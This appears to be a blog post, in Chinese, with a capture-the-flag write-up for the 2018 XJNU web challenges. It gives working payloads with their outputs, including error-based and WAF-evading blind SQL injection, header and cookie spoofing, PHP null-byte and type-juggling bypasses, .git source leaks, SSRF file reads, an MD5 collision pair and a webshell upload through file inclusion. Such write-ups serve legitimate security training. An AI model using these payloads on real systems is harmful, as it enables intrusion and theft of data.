@@ -1,0 +1,142 @@
+<!doctype html><html lang=zh-cn><title>2018 XJNU CTF Web Writeup - imlonghao</title><meta name=description content="比较简单的新疆师范大学的 CTF 比赛 http://ctf.xjnu.edu.cn/"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=renderer content="webkit"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><link rel=dns-prefetch href=//vip1.loli.net><link rel=stylesheet href=/static/hw3x7x.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css integrity="sha256-GxdCIOyfxQ1OBfS99qAIJDoGK1ADuBsxhMTqXG82fAY=" crossorigin=anonymous><script src=/static/hw3x7x.js async></script><script src=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js integrity="sha256-LVaMHPQ2zLqOc5rXSAfr4d1PIkEGNLyyUTDNPZmTtUw=" crossorigin=anonymous></script><script src=//instant.page/3.0.0 type=module defer integrity=sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1></script><link rel=alternate type=application/rss+xml title="imlonghao Feed" href=https://imlonghao.com/feed.xml><div id=container><div id=header><div id=post-nav><a href=./>Home</a>
+&nbsp;»&nbsp;
+<a href=./54.html>2018 XJNU CTF Web Writeup</a></div></div><div class=clearfix></div><div id=title>2018 XJNU CTF Web Writeup</div><div id=content class=markdown-body><h1>2018 XJNU CTF Web Writeup</h1><p>比较简单的新疆师范大学的 CTF 比赛 <a href=http://ctf.xjnu.edu.cn/ rel=nofollow>http://ctf.xjnu.edu.cn/</a><h2>Web10</h2><p>整个网站疯狂暗示使用 sqlmap，然后网站源代码中有这样一段<pre><code>&lt;!-- id=1 --&gt;
+</code></pre><p>然后在链接中加上 <code>?id=1</code> 进行测试，出现了不同的返回。<p>初步判断 SQL 语句为：<pre><code class=language-sql>select xxx from xxx where id=1
+</code></pre><p>然后没有做任何的过滤，并且报错直接显示出来，因此使用报错注入。<pre><code>http://ctf.xjnu.edu.cn:9900/web10/?id=1%20and%20extractvalue(1,concat(0x7e,(select%20flag%20from%20flag),0x7e))
+
+XPATH syntax error: '~flag{Test_y0u_sql_Inject!}~'
+</code></pre><h2>Web20</h2><p>直接访问题目地址<pre><code>&gt; http http://ctf.xjnu.edu.cn:9900/web20/
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Length: 21
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 20 Sep 2018 15:39:57 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: login=0
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+你不属于这里！
+</code></pre><p>然后目测是 XFF 判断本地<pre><code>&gt; http http://ctf.xjnu.edu.cn:9900/web20/ X-Forwarded-For:127.0.0.1
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Length: 24
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 20 Sep 2018 15:44:55 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: login=0
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+你还没有登录呢？
+</code></pre><p>然后看到服务器给我们 Set 了一个 Cookie，修改为 1<pre><code>&gt; http http://ctf.xjnu.edu.cn:9900/web20/ X-Forwarded-For:127.0.0.1 Cookie:login=1
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Length: 31
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 20 Sep 2018 15:46:00 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: login=0
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+很可惜你不是iPhone OS 999
+</code></pre><p>然后去网上找了个 iPhone 的 User-Agent，并且改成了 <code>iPhone OS 999</code><pre><code>&gt; http http://ctf.xjnu.edu.cn:9900/web20/ X-Forwarded-For:127.0.0.1 Cookie:login=1 User-Agent:&quot;Mozilla/5.0 (iPhone; CPU iPhone OS 999 like Mac OS X) AppleWebKit/604.1.34 Safari/604.1&quot;
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Length: 28
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 20 Sep 2018 15:50:17 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: login=0
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+flag: flag{h77p_He4dEr_50_E4sy}
+
+&lt;!-- flag not in html... --&gt;
+</code></pre><h2>Web30</h2><p>提示：小明 shell 下的编辑器用的比较 6<p>因此判断应该存在 shell 下运行编辑器时意外退出所留下的备份文件，扫描后发现了这个地址<p><a href=http://ctf.xjnu.edu.cn:9900/web30/.index.php.swo rel=nofollow>http://ctf.xjnu.edu.cn:9900/web30/.index.php.swo</a><pre><code class=language-php>&lt;?php
+$get = $_GET['ctf'];
+if ($get == '!#?&amp;@') {
+    echo '&lt;p&gt; class=&quot;alert&quot;&gt;Go on!&lt;/p&gt;';
+} else {
+    exit();
+}
+if (isset($_GET['password'])) {
+    if (ereg(&quot;^[a-zA-Z0-9]+$&quot;, $_GET['password']) === FALSE) echo '&lt;p class=&quot;alert&quot;&gt;You password is error,must be test others&lt;/p&gt;';
+    else if (strpos($_GET['password'], '--') !== FALSE){
+        $a = @$_GET['xjnu'];
+        $v1 = 0;
+        if (is_array($a)) {
+            is_numeric(@$a[&quot;bar1&quot;]) ? die(&quot;No way!&quot;) : NULL;
+            if (@$a[&quot;bar1&quot;]) {
+                ($a[&quot;bar1&quot;] &gt; 2016) ? $v1 = 1 : NULL;
+            }
+            if (is_array(@$a[&quot;bar2&quot;])) {
+                if (count($a[&quot;bar2&quot;]) !== 3 or !is_array($a[&quot;bar2&quot;][0])) die(&quot;No way!&quot;);
+                foreach ($a[&quot;bar2&quot;] as $key =&gt; $val) {
+                    if (preg_match('/2018/', $val)) {
+                        die('No way!');
+                    }
+                    if ($val == 2018) {
+                        die($flag);
+                    }
+                }
+            }
+        }
+    }
+    else echo '&lt;p class=&quot;alert&quot;&gt;Invalid password&lt;/p&gt;';
+}
+</code></pre><p>首先要满足的条件是 get 中的 ctf 参数为 <code>!#?&@</code> ，而默认情况下 <code>#</code> 以及其后面的东西不会被当成参数传递给服务器，所以我直接用 python 写参数了<pre><code>&gt;&gt;&gt; requests.get('http://ctf.xjnu.edu.cn:9900/web30/',params={'ctf':'!#?&amp;@'}).text
+'&lt;p class=&quot;alert&quot;&gt;Go on!&lt;/p&gt;'
+</code></pre><p>ereg 方法存在 <code>%00</code> 截断漏洞，因此可以将 password 分为两部分，前面一部分是符合正则条件的字符，后面再加上 <code>--</code> 满足第二个要求<pre><code>&gt;&gt;&gt; requests.get('http://ctf.xjnu.edu.cn:9900/web30/',params={'ctf':'!#?&amp;@','password':'0'+chr(0)+'--'}).text
+'&lt;p class=&quot;alert&quot;&gt;Go on!&lt;/p&gt;'
+</code></pre><p>然后参数 xjnu 需要是一个数组，数组中的 bar1 不能是数字但是他要大于 2016，这里我们将 bar1 设置为<code>2017a</code>，根据 PHP 特色，<code>'2017a'>2016</code><pre><code>&gt;&gt;&gt; requests.get('http://ctf.xjnu.edu.cn:9900/web30/',params={'ctf':'!#?&amp;@','password':'0'+chr(0)+'--','xjnu[bar1]':'2017a'}).text
+'&lt;p class=&quot;alert&quot;&gt;Go on!&lt;/p&gt;'
+</code></pre><p>然后 bar2 需要是一个数组，并且他的第一个元素也是一个数组，并且他有三个元素。此外 bar2 中还需要有一个元素等于 2018，但是其元素本身不允许存在字符 2018，因此这里用十六进制来表示<pre><code>&gt;&gt;&gt; requests.get('http://ctf.xjnu.edu.cn:9900/web30/',params={'ctf':'!#?&amp;@','password':'0'+chr(0)+'--','xjnu[bar1]':'2017a','xjnu[bar2][0][]':'0','xjnu[bar2][1]':'1','xjnu[bar2][2]':'0x7E2'}).text
+'&lt;p class=&quot;alert&quot;&gt;Go on!&lt;/p&gt;flag{Php_iS_Mag1c!}'
+</code></pre><h2>Web40</h2><p>题目没有给太多的提示，简单扫描之后发现了 .git 文件夹，通过 GitHack 找到了两个文件<pre><code>&gt; cat flag_2333_666.php
+&lt;?php
+//$flag=&quot;{.git_H0w_Many_Y0u_kn0w!}&quot;
+
+&gt; cat index.php
+&lt;?php
+echo &quot;flag is here&quot;;
+</code></pre><p>将 flag 拼凑成固定的格式即得：<code>flag{.git_H0w_Many_Y0u_kn0w!}</code><h2>Web50</h2><p>题目是一个登录界面，源代码中有提示，注入方向应该是密码列：<pre><code>&lt;!-- password  columns--&gt;
+</code></pre><p>用户名存在但密码错误会返回 <code>pass error</code><p>用户名不存在会返回 <code>no such user</code><p>预计其使用了类似的 SQL 语句<pre><code class=language-sql>select * from xxx where username='admin'
+</code></pre><p>存在 WAF，过滤了如下：<ul><li>空格<li>select<li>union<li>and<li>mid<li>ascii<li>from<li>order<li>by<li>井号(#)<li>sleep<li>substr</ul><p>构建注入代码<pre><code>a'/**/or/**/'1'='1
+</code></pre><p>返回了 <code>pass error</code>，说明存在注入<p>进一步构造，使用 left 函数逐位检查密码，丢入 Burpsuite 进行批量检查，例如<pre><code>a'/**/or/**/left(password,1)='5
+</code></pre><p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/8MG5zaOINJKFdy2.png><p>最终得到 32 位的密码，登录即可得 Flag<pre><code>5781865f070113b76a9f40d48944d52b
+
+flag{Waf_is_N0t_Exits!}
+</code></pre><h2>Web60</h2><p>Hint: whois 找不到信息，也可以使用 ip 地址进行 whois 的吧<p>打开题目，源代码中有这样一段<pre><code>&lt;!-- [Redacted]！网址www.nk-[Redacted].com:2018) --&gt;
+</code></pre><p>然后看了看当前页面端口是 2017，直接改成 2018 就打开了另外一个页面<blockquote><p>既然你费了这么大的劲来到了这里，我就直接告诉你，我们已经掌握了你们学校主站点的申请人的邮箱地址，需要你再次确认此邮箱是否正确，方能加入我们！</blockquote><p>让我们输入一个邮箱，结合提示，<code>whois 218.195.132.22</code><p>输入 <code>redrose@xj.cninfo.net</code> 即可以进行下一步<p>有一个 geturl 的按钮，有一个输入网址的地方，目测是一个 SSRF<p>输入了 <code>aaaa://index.php</code> 提交，然后奇迹发生了<pre><code class=language-php>if (preg_match('/index.php|flag_ssRf.php|etc/', $link)) {
+    # code...
+    echo file_get_contents(substr($link, 7));
+}
+</code></pre><p>大概的设计是输入 <code>http://</code> 开头的使用 curl 请求，包含了 <code>index.php</code> 这三个文件的直接读物文件内容并输出，因此顺利拿到 flag<h2>Web80</h2><p>一打开题目就提示 <code>Git Revenge Come on</code> 了，直接使用 GitHack，然后只能下载到 index.php，然而并没有什么用，所以直接将整个 .git 文件夹下了下来<pre><code>commit bcf528e51e475cf22e864b7cbb7f1770124cc006 (HEAD -&gt; master)
+Author: Huseck &lt;504038236@qq.com&gt;
+Date:   Wed Sep 19 20:02:51 2018 +0800
+
+    remove something
+
+commit bbb02a35384a81b4c003ce3e4ae03246b3638de0
+Author: Huseck &lt;504038236@qq.com&gt;
+Date:   Wed Sep 19 20:01:59 2018 +0800
+
+    xjseck
+</code></pre><p>发现有两个 commit，切换到第一个就能看到有三个文件了<p>flag_Revenge_2333333.php<pre><code class=language-php>&lt;?php
+include 'flag.php';
+if((string)$_POST['param1']!==(string)$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2'])){
+                    die($flag);
+                }
+highlight_file(__FILE__);
+</code></pre><p>和上面那题使用的 GitHack 一样，考查 PHP 的特性，我们需要提交两个名字不一样但是 MD5 一样的玩意，通常我直接使用下面这个文件，使用 hexedit 直接写入成文件就好了，然后提交过去就能得到 flag<p>文件 1：<pre><code>4dc968ff0ee35c209572d4777b721587
+d36fa7b21bdc56b74a3dc0783e7b9518
+afbfa200a8284bf36e8e4b55b35f4275
+93d849676da0d1555d8360fb5f07fea2
+</code></pre><p>文件 2：<pre><code>4dc968ff0ee35c209572d4777b721587
+d36fa7b21bdc56b74a3dc0783e7b9518
+afbfa202a8284bf36e8e4b55b35f4275
+93d849676da0d1d55d8360fb5f07fea2
+</code></pre><h2>Web100</h2><p>打开题目跳转到 <code>http://ctf.xjnu.edu.cn:666/index.php?file=upload.php</code><p>目测就存在文件包含漏洞。<p>没什么难度，生成一个文件名为 .png 的一句话，上传，包含，搞定</div></div><div id=disqus_thread></div><div id=footer><span>Copyright © 2015 - 2020 imlonghao. Theme by
+<a href=http://simiki.org/ target=_blank rel="noopener noreferrer">Simiki</a>. CC BY-NC-SA 4.0</span></div><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3/cfga.min.js integrity="sha256-TXHTTKAPRQ9mgacgN+couk0xnzQ6uOXTZ5ojH1q6GUk=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.3.0/dist/lazyload.min.js integrity="sha256-bojBIKfs4l2WDcJODncBIGEe5fhU7/sM3zRO5/f2nqE=" crossorigin=anonymous async></script>
